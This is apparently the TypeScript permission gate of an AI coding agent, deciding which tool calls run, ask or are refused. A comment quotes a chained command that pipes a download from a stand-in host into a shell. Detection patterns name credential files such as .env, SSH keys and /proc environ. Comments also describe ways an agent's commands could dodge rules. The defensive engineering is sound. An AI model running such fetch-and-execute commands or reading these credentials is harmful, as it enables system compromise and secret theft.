/**
 * The gate every tool call passes before it runs.
 *
 * Order of authority, first answer wins:
 *   1. `deny` rules in `$MNEMO_HOME/permissions.json`, anywhere in the list
 *   2. plan mode, which refuses every change, `allow` rules included
 *   3. the other rules (`allow` / `ask`, first match)
 *   4. credentials, which read tools refuse unless a rule allowed them
 *   5. the mode (yolo allows the rest) and the kind of tool: reading is free,
 *      edits and commands ask
 *   6. for commands, grants the user gave earlier ("don't ask again for git status*")
 * If the gate cannot start or fails on a call, the call is refused.
 *
 * The question itself goes to the interface. With no interface (`mnemo -p`) an
 * ask is allowed: headless runs are automation the user started on purpose, and
 * a deny rule is still a deny. The gate filters what runs; it is not a sandbox.
 */
import * as fs from "node:fs";
import * as path from "node:path";
import type { ExtensionAPI } from "@earendil-works/pi-coding-agent";
import { COMPOUND, commandSegments, decide } from "../policy/gate.ts";
import { nativeSystem, realTarget, within, type PathSystem } from "../policy/paths.ts";
import type { ApprovalRequest } from "../runtime/dialogs.ts";
import type { Host } from "./host.ts";
import { hostsIn, isMetadata, normalHost } from "../policy/egress.ts";
import { allowedMode, loadManaged } from "../policy/managed.ts";

const READ = new Set(["read", "grep", "find", "ls", "code_search", "code_symbol", "code_refs", "code_map", "memory_search", "memory_remember", "memory_steer", "spawn_subagent", "list_agents", "message_agent", "task_update", "tool_search", "ask_user"]);
/** Read-class tools that still write to memory: plan mode is "change nothing", memory included. */
const WRITES_MEMORY = new Set(["memory_remember", "memory_steer"]);
const EDIT = new Set(["edit", "write", "create_skill", "update_skill"]);
/** A race runs its check command, and its attempts work unattended in copies of the project. */
const EXEC = new Set(["bash", "powershell", "ipy_run", "race"]);
const MCP_RESOURCES = new Set(["list_mcp_resources", "list_mcp_resource_templates", "read_mcp_resource"]);
/** A tool an MCP server provides (`mcp__<server>__<tool>`) or reads through: what it does is the server's to say. */
const isMcp = (tool: string) => tool.startsWith("mcp__") || MCP_RESOURCES.has(tool);

export interface Rule {
  tool: string;
  pattern?: string;
  action: "allow" | "ask" | "deny";
  /** Said after the rule's name when it refuses a call. */
  note?: string;
}

interface GrantsFile {
  projects: Record<string, string[]>;
  global: string[];
}

/** Only well-formed grants: a grants.json of `null` or `5` once threw in the factory and pi ran without a gate. */
function readGrants(file: string): GrantsFile {
  let raw: unknown;
  try {
    raw = JSON.parse(fs.readFileSync(file, "utf8"));
  } catch {
    raw = undefined;
  }
  const isObject = (v: unknown): v is Record<string, unknown> => v !== null && typeof v === "object" && !Array.isArray(v);
  const strings = (v: unknown) => (Array.isArray(v) ? v.filter((s): s is string => typeof s === "string") : []);
  const data = isObject(raw) ? raw : {};
  const projects: Record<string, string[]> = {};
  if (isObject(data.projects)) for (const [cwd, list] of Object.entries(data.projects)) projects[cwd] = strings(list);
  return { projects, global: strings(data.global) };
}

const NO_GRANTS = { project: [], global: [], deny: [] };

/** What a broken permissions.json means: nothing that changes anything runs until it is fixed. */
const BROKEN: Rule[] = [...EDIT, ...EXEC].map((tool) => ({ tool, action: "deny" as const, note: "permissions.json cannot be read, so Mnemo refuses to change anything until it is fixed" }));

export function loadRules(home: string): Rule[] {
  const file = path.join(home, "permissions.json");
  let raw: unknown;
  try {
    raw = JSON.parse(fs.readFileSync(file, "utf8"));
  } catch (error) {
    // No file is no rules. A file that is there and cannot be understood is not:
    // reading it as "no rules" would quietly turn every deny into nothing.
    return (error as NodeJS.ErrnoException).code === "ENOENT" ? [] : BROKEN;
  }
  // `null`, a number or `{"rules": null}` is a file that cannot be understood, not "no rules".
  const list = Array.isArray(raw) ? raw : raw !== null && typeof raw === "object" ? ("rules" in raw ? raw.rules : []) : undefined;
  if (!Array.isArray(list)) return BROKEN;
  const valid = (r: Rule) =>
    r && typeof r.tool === "string" && ["allow", "ask", "deny"].includes(r.action) && (r.pattern === undefined || typeof r.pattern === "string");
  return list.every(valid) ? (list as Rule[]) : BROKEN;
}

/**
 * The rules a call is judged by: the administrator's first, so a managed `ask` or `deny` comes
 * before any `allow` of the user's, then the user's own.
 */
export function rulesOf(host: Pick<Host, "home" | "managedFile">): Rule[] {
  return [...(loadManaged(host.managedFile)?.rules ?? []), ...loadRules(host.home)];
}

/** `*` matches anything; everything else is literal. Linear in the text, with no backtracking. */
export function globMatch(pattern: string, text: string): boolean {
  let p = 0;
  let t = 0;
  let star = -1;
  let mark = 0;
  while (t < text.length) {
    if (p < pattern.length && pattern[p] === "*") {
      star = p++;
      mark = t;
    } else if (p < pattern.length && pattern[p] === text[t]) {
      p++;
      t++;
    } else if (star >= 0) {
      p = star + 1;
      t = ++mark;
    } else return false;
  }
  while (pattern[p] === "*") p++;
  return p === pattern.length;
}

/** The argument that makes a call dangerous: the command, the path, the code. */
export function subjectOf(tool: string, input: Record<string, unknown>): string {
  if (isMcp(tool)) return JSON.stringify(input);
  if (tool === "race") return typeof input.check === "string" ? input.check : "";
  const v = input.command ?? input.path ?? input.code ?? input.pattern ?? input.name ?? "";
  return typeof v === "string" ? v : JSON.stringify(v);
}

export function matchRule(rules: readonly Rule[], tool: string, subject: string): Rule | undefined {
  return rules.find((r) => globMatch(r.tool, tool) && (r.pattern === undefined || globMatch(r.pattern, subject)));
}

const SHELLS = /^(?:sh|bash|zsh|dash|ksh)$/;
/**
 * Commands that run the rest of their words as a command, each with the options
 * that take a value (so `sudo -u root rm` is read as `rm`, not as `root rm`).
 */
const WRAPPERS: Record<string, readonly string[]> = {
  env: ["-u", "--unset", "-C", "--chdir"],
  sudo: ["-u", "--user", "-g", "--group", "-C", "--close-from", "-D", "--chdir", "-h", "--host", "-p", "--prompt", "-r", "--role", "-t", "--type", "-T", "--command-timeout", "-U", "--other-user", "-R", "--chroot"],
  doas: ["-u", "-C"],
  nice: ["-n", "--adjustment"],
  timeout: ["-s", "--signal", "-k", "--kill-after"],
  xargs: ["-a", "--arg-file", "-d", "--delimiter", "-E", "-e", "-I", "-L", "-l", "-n", "--max-args", "-P", "--max-procs", "-s", "--max-chars"],
  exec: ["-a"],
  stdbuf: ["-i", "-o", "-e", "--input", "--output", "--error"],
  ionice: ["-c", "--class", "-n", "--classdata"],
  time: ["-f", "--format", "-o", "--output"],
  nohup: [],
  command: [],
  builtin: [],
  eval: [],
};

/** The words after a wrapper and its options: the command it runs. */
function unwrap(wrapper: string, words: string[]): string[] {
  const takesValue = WRAPPERS[wrapper]!;
  let i = 1;
  while (i < words.length && /^[-+]./.test(words[i]!)) {
    if (words[i] === "--") {
      i++;
      break;
    }
    i += takesValue.includes(words[i]!) ? 2 : 1;
  }
  // `timeout 5 curl x`: the first operand is the duration.
  if (wrapper === "timeout") i++;
  return words.slice(i);
}

/**
 * A command word as the shell finds the program: quotes and escapes gone
 * (`"rm"`, `\rm`, `r''m`), directories dropped. Where names have no case
 * (PowerShell, Windows), lower case and without `.exe`.
 */
function programName(word: string, ps: boolean, ci: boolean): string {
  let w = ps ? word.replace(/['"`]/g, "").replace(/^.*[\\/]/, "") : word.replace(/['"\\]/g, "").replace(/^.*\//, "");
  if (ci) w = w.toLowerCase().replace(/\.(?:exe|cmd|bat|com)$/, "");
  return w;
}

/**
 * The ways a command line can be read: as typed, and as each command inside it
 * once spaces, `VAR=x` prefixes, quotes, directories (`/usr/bin/env`), wrappers
 * (`sudo -u root`, `env -u X`, `timeout 5`, `xargs`, `eval`), `find -exec` and
 * `sh -c '…'` are looked through. A rule that names a command is tested against
 * all of them, so `env*` also stops `true && /usr/bin/env` and `sh -c env`.
 * This is a filter for honest mistakes and injected prompts, not a parser of shell.
 */
export function commandVariants(command: string, depth = 0, shell: "sh" | "powershell" = "sh"): string[] {
  const ps = shell === "powershell";
  const ci = ps || process.platform === "win32";
  const whole = command.trim().replace(/\s+/g, " ");
  const out = new Set<string>([whole]);
  const nested = (inner: string) => {
    if (depth < 3) for (const v of commandVariants(inner, depth + 1, shell)) out.add(v);
  };
  // `sh -c '…'` as a whole first: splitting would cut the quoted command in two.
  const wrapped = /^\s*(?:\S*\/)?(?:sh|bash|zsh|dash|ksh)\s+(?:(?:[-+]o\s+\w+|[-+]\w+)\s+)*?-\w*c\w*\s+(['"])([\s\S]*)\1\s*$/.exec(command);
  if (wrapped) nested(wrapped[2]!);
  for (const segment of commandSegments(command)) {
    let words = segment.split(/\s+/);
    const add = () => out.add(words.join(" "));
    add();
    for (let guard = 0; guard < 10 && words.length; guard++) {
      const first = words[0]!;
      if (/^[A-Za-z_][A-Za-z0-9_]*=/.test(first)) words = words.slice(1);
      else if (ps && (first === "&" || first === ".")) words = words.slice(1);
      else if (programName(first, ps, ci) !== first) words = [programName(first, ps, ci), ...words.slice(1)];
      else if (Object.hasOwn(WRAPPERS, first)) words = unwrap(first, words);
      else break;
      if (words.length) add();
    }
    if (words.length >= 2 && SHELLS.test(words[0]!)) {
      // `bash -e -o pipefail -c '…'`: options, then the command.
      let i = 1;
      let c = false;
      while (i < words.length && /^[-+]\w/.test(words[i]!)) {
        if (/^[-+]o$/.test(words[i]!)) i += 2;
        else if (/^-\w*c\w*$/.test(words[i++]!)) {
          c = true;
          break;
        }
      }
      if (c && i < words.length) nested(words.slice(i).join(" ").replace(/^(['"])([\s\S]*)\1$/, "$2"));
    }
    if (words[0] === "find") {
      const at = words.findIndex((w) => /^-(?:exec|execdir|ok|okdir)$/.test(w));
      if (at > 0 && at + 1 < words.length) nested(words.slice(at + 1).join(" "));
    }
  }
  return [...out].filter(Boolean);
}

/** Tools whose `path` names a file or folder the gate reasons about. */
const PATH_TOOLS = new Set(["read", "grep", "find", "ls", "edit", "write", "code_symbol", "code_map"]);

/** The subjects a rule on this call is tested against. */
function subjectsOf(tool: string, subject: string): string[] {
  return EXEC.has(tool) && tool !== "ipy_run" ? commandVariants(subject, 0, tool === "powershell" ? "powershell" : "sh") : [subject.trim()];
}

/**
 * Where a file tool's path lands, as rules see it: relative to the project
 * with `/` when it is inside, and absolute. Matching these rather than the
 * text means `src/*` does not cover `src/../../etc/x`, and `.env*` covers
 * `./.env`, `@.env` and `file:///…/.env`.
 */
function landedSubjects(cwd: string, p: string, sys: PathSystem): string[] {
  const target = realTarget(cwd, p, sys);
  const root = sys.real(cwd);
  if (target === undefined || root === undefined) return [];
  const rel = within(root, target, sys);
  const slash = (s: string) => (sys.windows ? s.replaceAll("\\", "/") : s);
  return [...(rel === undefined ? [] : [rel === "" ? "." : slash(rel)]), target, ...(sys.windows ? [slash(target)] : [])];
}

function ruleHits(r: Rule, tool: string, subjects: readonly string[], ci = false): boolean {
  if (!globMatch(r.tool, tool)) return false;
  if (r.pattern === undefined) return true;
  const pattern = ci ? r.pattern.toLowerCase() : r.pattern;
  return subjects.some((s) => globMatch(pattern, ci ? s.toLowerCase() : s));
}

/**
 * An allow rule for a command ends on a word: `git status*` covers `git status`
 * and `git status --short`, not `git statusx`. An allow widens what runs, so
 * it gets the narrow reading; deny and ask keep the broad one.
 */
function allowHits(r: Rule, tool: string, subjects: readonly string[], ci: boolean, command: boolean): boolean {
  if (!command || r.pattern === undefined || !/[^\s*]\*$/.test(r.pattern)) return ruleHits(r, tool, subjects, ci);
  const stem = r.pattern.slice(0, -1);
  return ruleHits({ ...r, pattern: stem }, tool, subjects, ci) || ruleHits({ ...r, pattern: `${stem} *` }, tool, subjects, ci);
}

/**
 * Where code and configuration that run later live, at any depth: never
 * changed unasked, even by accept-edits.
 */
const CONTROL_DIRS = new Set([".git", ".githooks", ".pi", ".agents", ".mnemo", ".husky", ".github", ".claude", ".vscode", ".idea", ".devcontainer"]);
/** What a shell or ssh runs or trusts from the home folder. */
const HOME_FILES = new Set([".bashrc", ".bash_profile", ".bash_login", ".bash_logout", ".profile", ".zshrc", ".zprofile", ".zshenv", ".zlogin", ".zlogout", ".cshrc", ".tcshrc", ".kshrc", ".inputrc", ".ssh", ".gitconfig", ".config", ".local"]);

function insideProject(cwd: string, p: unknown, sys: PathSystem): boolean {
  if (typeof p !== "string") return false;
  const target = realTarget(cwd, p, sys);
  const root = sys.real(cwd);
  if (target === undefined || root === undefined) return false;
  const rel = within(root, target, sys);
  if (rel === undefined) return false;
  if (rel.split(/[\\/]/).some((part) => CONTROL_DIRS.has(part.toLowerCase()))) return false;
  const home = sys.real(sys.home);
  const inHome = home === undefined ? undefined : within(home, target, sys);
  return !(inHome && HOME_FILES.has(inHome.split(/[\\/]/)[0]!.toLowerCase()));
}

/** Files and folders that hold credentials: no read tool needs them. */
function secretLocations(host: { home?: string; agentDir?: string }, sys: PathSystem): string[] {
  const j = sys.path.join;
  const out = [j(sys.home, ".ssh"), j(sys.home, ".aws"), j(sys.home, ".gnupg")];
  if (host.home) {
    const agent = host.agentDir ?? j(host.home, "agent");
    out.push(j(agent, "auth.json"), j(agent, "models.json"), j(host.home, "grants.json"), j(host.home, ".env"));
  }
  return out.map((p) => sys.real(p) ?? p);
}

/** A process's environment (where the provider keys are) and memory. */
const PROC_SECRET = /^\/proc\/[^/]+\/(?:task\/[^/]+\/)?(?:environ|mem)$/;

/**
 * Files that hold secrets wherever they are: a project's `.env` (not `.env.example` and the like),
 * a private key, a `.netrc`. Read once, they are in the transcript and the provider's logs.
 */
const SECRET_FILE = /^(?:\.env(?:\.(?!(?:example|sample|template|dist|defaults?)$)[^.]+)*|id_(?:rsa|dsa|ecdsa|ed25519)(?:_sk)?|[._]netrc|\.pgpass)$/i;

/** Credentials a read tool is never needed for. A rule in permissions.json can still allow them. */
export function secretPath(host: { home?: string; agentDir?: string }, cwd: string, p: unknown, sys: PathSystem): boolean {
  if (typeof p !== "string") return false;
  const real = realTarget(cwd, p, sys);
  if (real === undefined) return false;
  if (!sys.windows && PROC_SECRET.test(real)) return true;
  if (SECRET_FILE.test(sys.path.basename(real))) return true;
  return secretLocations(host, sys).some((s) => within(s, real, sys) !== undefined);
}

/** A folder a search would read credentials in: one that holds any of them, or /proc. */
function holdsSecrets(host: { home?: string; agentDir?: string }, cwd: string, p: string, sys: PathSystem): boolean {
  const dir = realTarget(cwd, p, sys);
  if (dir === undefined) return false;
  if (!sys.windows && (within(dir, "/proc", sys) !== undefined || within("/proc", dir, sys) !== undefined)) return true;
  return secretLocations(host, sys).some((s) => within(dir, s, sys) !== undefined);
}

/** Terminal control bytes made visible, so a command cannot hide part of itself in the question. */
const plain = (s: string) => s.replace(/[\u0000-\u0008\u000b-\u001f\u007f-\u009f\u200b-\u200f\u202a-\u202e\u2066-\u2069]/g, (c) => (c === "\u001b" ? "␛" : "·"));

const TITLES: Record<string, string> = {
  bash: "Bash",
  edit: "Edit",
  write: "Write",
  ipy_run: "Python",
  powershell: "PowerShell",
  create_skill: "New skill",
  race: "Race",
  update_skill: "Change skill",
};

/** What the approval dialog shows for a call. */
export function approvalPreview(tool: string, input: Record<string, unknown>): ApprovalRequest["preview"] {
  const lines = (s: unknown) => (typeof s === "string" ? s.replace(/\s+$/, "").split("\n") : []);
  if (tool === "edit" && Array.isArray(input.edits)) {
    return (input.edits as { oldText?: string; newText?: string }[]).flatMap((e, i) => [
      ...(i > 0 ? [{ text: "⋯", tone: "muted" as const }] : []),
      ...lines(e.oldText).map((t) => ({ text: `- ${plain(t)}`, tone: "remove" as const })),
      ...lines(e.newText).map((t) => ({ text: `+ ${plain(t)}`, tone: "add" as const })),
    ]);
  }
  if (tool === "write") return lines(input.content).map((t) => ({ text: `+ ${plain(t)}`, tone: "add" as const }));
  if (tool === "ipy_run") return lines(input.code).map((t) => ({ text: plain(t) }));
  if (tool === "race") {
    const n = typeof input.n === "number" ? input.n : 2;
    return [
      { text: `${n} attempts, each in its own copy of this project, working unattended: nothing asks before their edits and commands there.`, tone: "muted" as const },
      { text: "Then this check runs in each copy, and the smallest change that passes is applied here.", tone: "muted" as const },
      ...lines(input.task).map((t) => ({ text: plain(t) })),
    ];
  }
  // The whole command, not just what fits a line: the part that matters is often the tail.
  if ((tool === "bash" || tool === "powershell") && typeof input.command === "string" && (input.command.includes("\n") || input.command.length > 80))
    return lines(input.command).map((t) => ({ text: plain(t) }));
  if (tool === "create_skill" || tool === "update_skill") {
    const scope = tool === "create_skill" ? `scope: ${input.scope ?? "project"}${input.scope === "user" ? " (every project)" : ""}` : "an existing skill";
    // The description is loaded into every later prompt, so it is part of what is being approved.
    const description = typeof input.description === "string" ? [{ text: `description: ${plain(input.description.replace(/\s+/g, " ").trim())}`, tone: "muted" as const }] : [];
    return [{ text: scope, tone: "muted" as const }, ...description, ...lines(input.instructions).map((t) => ({ text: `+ ${plain(t)}`, tone: "add" as const }))];
  }
  if (isMcp(tool)) return JSON.stringify(input, null, 2).split("\n").slice(0, 40).map((t) => ({ text: plain(t) }));
  return [];
}

export class Grants {
  private file: string;
  private data: GrantsFile;

  constructor(home: string) {
    this.file = path.join(home, "grants.json");
    this.data = readGrants(this.file);
  }

  for(cwd: string) {
    return { project: Object.hasOwn(this.data.projects, cwd) ? this.data.projects[cwd]! : [], global: this.data.global, deny: [] as string[] };
  }

  add(cwd: string, pattern: string): void {
    const list = Object.hasOwn(this.data.projects, cwd) ? this.data.projects[cwd]! : (this.data.projects[cwd] = []);
    if (!list.includes(pattern)) list.push(pattern);
    try {
      fs.mkdirSync(path.dirname(this.file), { recursive: true });
      fs.writeFileSync(this.file, JSON.stringify(this.data, null, 2), { mode: 0o600 });
    } catch {
      // A grant that cannot be saved still holds for this process.
    }
  }
}

/** A call as rules see it: its subject, its kind, and every spelling a rule is tested against. */
function framing(cwd: string, tool: string, input: Record<string, unknown>, sys: PathSystem) {
  const subject = subjectOf(tool, input);
  const kind = READ.has(tool) ? "read" : EDIT.has(tool) ? "edit" : EXEC.has(tool) ? "exec" : "other";
  const command = kind === "exec" && tool !== "ipy_run";
  const pathy = PATH_TOOLS.has(tool) && typeof input.path === "string";
  const landed = pathy ? landedSubjects(cwd, input.path as string, sys) : [];
  const subjects = pathy ? [subject.trim(), ...landed] : subjectsOf(tool, subject);
  // Names without case: PowerShell and Windows commands, and paths where the file system folds case.
  const ci = command ? tool === "powershell" || process.platform === "win32" : pathy && sys.fold;
  return { subject, kind, command, pathy, landed, subjects, ci };
}

const refusedBy = (r: Rule) => `Refused by a rule in permissions.json (${r.tool}${r.pattern ? ` ${r.pattern}` : ""})${r.note ? `: ${r.note}` : "."}`;

/**
 * Only the deny rules, for what a Python cell does itself (a subprocess, a file it opens): the
 * cell was approved as a whole, so nothing in it asks again, but a deny holds inside it too.
 */
export function denial(rules: readonly Rule[], cwd: string, tool: string, input: Record<string, unknown>, sys: PathSystem = nativeSystem()): string | undefined {
  const { subjects, ci } = framing(cwd, tool, input, sys);
  const denied = rules.find((r) => r.action === "deny" && ruleHits(r, tool, subjects, ci));
  return denied && refusedBy(denied);
}

/** Which of a cell's own actions the kernel checks: reads and writes only when a deny rule could stop them. */
export function kernelGuard(rules: readonly Rule[]): { exec: boolean; read: boolean; write: boolean; net: boolean } {
  const deny = rules.filter((r) => r.action === "deny");
  const names = (...tools: string[]) => deny.some((r) => tools.some((t) => globMatch(r.tool, t)));
  // Commands and connections are always checked: the metadata block holds with no rules at all.
  return { exec: true, read: names("read"), write: names("write", "edit"), net: true };
}

/**
 * What `net` rules say about connecting to these hosts: refused (a deny, or a cloud metadata
 * address no allow rule opens), asked (an `ask` rule, which beats any allow for the command),
 * or nothing to say.
 */
export function egress(rules: readonly Rule[], hosts: readonly string[]): { refuse: string } | { ask: Rule } | undefined {
  let ask: Rule | undefined;
  for (const raw of hosts) {
    const host = normalHost(raw);
    const denied = rules.find((r) => r.action === "deny" && ruleHits(r, "net", [host], true));
    if (denied) return { refuse: `${refusedBy(denied)} It connects to ${host}.` };
    const first = rules.find((r) => r.action !== "deny" && ruleHits(r, "net", [host], true));
    if (isMetadata(host) && first?.action !== "allow")
      return { refuse: `${host} is a cloud metadata address, which hands out this machine's credentials, so Mnemo does not connect to it. Add {"tool": "net", "pattern": "${host}", "action": "allow"} to permissions.json if you mean to.` };
    if (first?.action === "ask") ask ??= first;
  }
  return ask ? { ask } : undefined;
}

export type Verdict = { allow: true } | { allow: false; reason: string } | { ask: ApprovalRequest; pattern?: string };

/** The decision without the question: pure apart from reading `host.mode` and the disk (for symlinks). */
export function judge(
  host: Pick<Host, "mode"> & { home?: string; agentDir?: string },
  rules: readonly Rule[],
  grants: ReturnType<Grants["for"]>,
  cwd: string,
  tool: string,
  input: Record<string, unknown>,
  sys: PathSystem = nativeSystem(),
): Verdict {
  const { subject, kind, command, pathy, landed, subjects, ci } = framing(cwd, tool, input, sys);
  // A denial anywhere in the list wins, whatever order the rules are in and however
  // the command or path is dressed up.
  const denied = rules.find((r) => r.action === "deny" && ruleHits(r, tool, subjects, ci));
  if (denied) return { allow: false, reason: refusedBy(denied) };
  // Where a command connects, in every mode: `net` deny rules and the metadata block.
  const net = command ? egress(rules, hostsIn(subject)) : undefined;
  if (net && "refuse" in net) return { allow: false, reason: net.refuse };
  // Before any allow: plan mode is the user saying "change nothing", and a standing
  // allow rule was written for the other modes.
  if ((kind !== "read" || WRITES_MEMORY.has(tool)) && host.mode === "plan")
    return { allow: false, reason: "Plan mode is read-only: describe the change instead of making it. The user can leave plan mode with shift+tab." };
  // First match among allow and ask. An allow for a path is tested only where the
  // path lands, so `src/*` is not an allow for `src/../../etc/x`.
  let rule = rules.find((r) =>
    r.action === "allow"
      ? allowHits(r, tool, pathy ? landed : [subject.trim()], ci, command)
      : r.action === "ask" && ruleHits(r, tool, pathy ? subjects : [subject.trim()], ci),
  );
  // An allow for `git status*` is not an allow for `git status; curl evil | sh`.
  if (rule?.action === "allow" && command && COMPOUND.test(subject)) rule = undefined;
  // A host someone wants asked about is asked about, whatever allowed the command.
  if (net) rule = net.ask;
  rule ??= rules.find((r) => r.action === "ask" && ruleHits(r, tool, subjects, ci));
  if (rule?.action === "allow") return { allow: true };
  if (kind === "read" && secretPath(host, cwd, input.path, sys))
    return { allow: false, reason: "That file holds credentials, which Mnemo does not read. Add an allow rule in permissions.json if you need it." };
  // pi's grep searches hidden files: over `~` or Mnemo's home it would print the keys.
  if (tool === "grep" && holdsSecrets(host, cwd, typeof input.path === "string" ? input.path : ".", sys))
    return {
      allow: false,
      reason: "That folder holds credentials (~/.ssh, ~/.aws, ~/.gnupg, Mnemo's keys or /proc), which Mnemo does not search. Search a folder below it, or add an allow rule in permissions.json.",
    };
  if (rule?.action !== "ask") {
    if (kind === "read" || host.mode === "yolo") return { allow: true };
    // Accept-edits is for files in this project. A skill is instructions loaded into
    // every later session, and `.git`, `.pi` and friends run code, so those still ask.
    if ((tool === "edit" || tool === "write") && host.mode === "accept-edits" && insideProject(cwd, input.path, sys)) return { allow: true };
  }
  const shown = subject.split("\n")[0]!;
  const request: ApprovalRequest = {
    tool: TITLES[tool] ?? tool,
    subject: plain(shown.length > 200 ? `${shown.slice(0, 200)}… (+${shown.length - 200} more characters)` : shown),
    preview: approvalPreview(tool, input),
  };
  // An MCP tool is approved by name: "always" covers that one tool of that server, in this project.
  if (isMcp(tool) && rule?.action !== "ask") {
    const grant = `tool:${tool}`;
    if (grants.project.includes(grant) || grants.global.includes(grant)) return { allow: true };
    request.reason = "A tool of an MCP server: what it does is up to the server.";
    request.always = tool;
    return { ask: request, pattern: grant };
  }
  if (tool === "bash" && rule?.action !== "ask") {
    const g = decide({ toolName: tool, input }, grants);
    if (g.decision === "allow") return { allow: true };
    request.reason = g.reason;
    if (g.offerAlways && g.pattern) {
      request.always = g.pattern;
      return { ask: request, pattern: g.pattern };
    }
  }
  return { ask: request };
}

/**
 * The signal of a tool that is making calls of its own (the Python cell), by its
 * call id. A question about one of those calls closes when that tool stops: pi
 * hands the hook the turn's signal, which a timed-out cell does not abort.
 */
export const callerSignals = new Map<string, AbortSignal>();

export function policyExtension(host: Host) {
  return (pi: ExtensionAPI): void => {
    // A factory that throws is dropped by pi, and the session then runs with no gate
    // at all. So a gate that cannot start stays registered and refuses every change.
    let grants: Grants | undefined;
    let broken: string | undefined;
    try {
      grants = new Grants(host.home);
    } catch (error) {
      broken = error instanceof Error ? error.message : String(error);
    }
    pi.on("tool_call", async (event, ctx) => {
      const input = (event.input ?? {}) as Record<string, unknown>;
      let verdict: Verdict;
      try {
        if (broken !== undefined && !READ.has(event.toolName))
          return { block: true, reason: `Mnemo's permission gate could not start (${broken}), so it refuses every change until that is fixed.` };
        // The mode the user picked, within what the managed policy allows (`yolo` may not be one).
        const managed = loadManaged(host.managedFile);
        const rules = [...(managed?.rules ?? []), ...loadRules(host.home)];
        const at = { mode: allowedMode(host.mode, managed), home: host.home, agentDir: host.agentDir };
        verdict = judge(at, rules, grants?.for(ctx.cwd) ?? NO_GRANTS, ctx.cwd, event.toolName, input);
      } catch (error) {
        return { block: true, reason: `Mnemo's permission gate failed on this call (${error instanceof Error ? error.message : String(error)}), so it is refused.` };
      }
      if ("allow" in verdict) return verdict.allow ? undefined : { block: true, reason: verdict.reason };
      if (!host.ui) return undefined;
      const caller = event.parentToolCallId === undefined ? undefined : callerSignals.get(event.parentToolCallId);
      const signal = caller && ctx.signal ? AbortSignal.any([ctx.signal, caller]) : (caller ?? ctx.signal);
      // Where the file lands, as approved. The question can stay open for minutes, and a symlink
      // swapped in meanwhile (by a command still running) would carry the write somewhere else.
      const lands = () => (typeof input.path === "string" ? realTarget(ctx.cwd, input.path) : undefined);
      const before = lands();
      const answer = await host.ui.approve(verdict.ask, signal);
      // A cell that stopped while the question was open: its call is not run, whatever the answer.
      if (caller?.aborted) return { block: true, reason: "The call's Python cell stopped before it was answered." };
      if (answer.kind !== "no" && lands() !== before)
        return { block: true, reason: `${String(input.path)} now leads somewhere else than when it was approved (${lands() ?? "nowhere"}), so the call is refused. Look at it again before retrying.` };
      if (answer.kind === "yes") return undefined;
      if (answer.kind === "always") {
        if (verdict.pattern) grants?.add(ctx.cwd, verdict.pattern);
        else if (EDIT.has(event.toolName)) host.mode = "accept-edits";
        return undefined;
      }
      const what = `${verdict.ask.tool}(${verdict.ask.subject})`;
      host.signals.push(answer.feedback ? `The user refused ${what} and said: "${answer.feedback}"` : `The user refused ${what}.`);
      return {
        block: true,
        reason: answer.feedback
          ? `The user declined this call and said: ${answer.feedback}`
          : "The user declined this call. Ask what they would prefer before trying something similar.",
      };
    });
  };
}

